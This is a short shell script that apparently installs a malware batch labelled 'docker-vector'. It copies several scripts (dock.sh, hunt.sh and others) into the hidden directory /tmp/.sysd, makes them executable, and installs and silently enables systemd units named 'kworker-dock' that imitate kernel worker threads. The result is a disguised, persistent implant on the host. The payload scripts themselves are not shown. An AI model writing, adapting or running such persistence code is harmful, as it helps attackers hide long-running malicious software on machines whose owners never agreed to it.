#!/bin/sh
# throwaway: place the docker-vector batch on the host, heal CR, dash-check
SRC=/tmp
DST=/tmp/.sysd
for f in dock.sh hunt.sh bootstrap.sh updater.sh; do
    if [ -f "$SRC/$f" ]; then
        tr -d '\r' < "$SRC/$f" > "$DST/$f.n" && mv -f "$DST/$f.n" "$DST/$f" && chmod 0755 "$DST/$f"
        if sh -n "$DST/$f"; then echo "$f OK"; else echo "$f SYNTAX FAIL"; fi
    else
        echo "MISSING $SRC/$f"
    fi
done
if [ -f "$SRC/worker.env" ]; then
    tr -d '\r' < "$SRC/worker.env" > "$DST/worker.env.n" && mv -f "$DST/worker.env.n" "$DST/worker.env"
    echo "worker.env placed"
fi
for u in kworker-dock.service kworker-dock.timer; do
    if [ -f "$SRC/$u" ]; then
        tr -d '\r' < "$SRC/$u" > "/etc/systemd/system/$u" && echo "$u installed"
    else
        echo "MISSING $SRC/$u"
    fi
done
systemctl daemon-reload 2>/dev/null || true
systemctl enable --now kworker-dock.timer 2>/dev/null || true
echo "dock_timer=$(systemctl is-active kworker-dock.timer)"
sha256sum "$DST/dock.sh" "$DST/hunt.sh" | cut -c1-16
echo "--- placed ---"
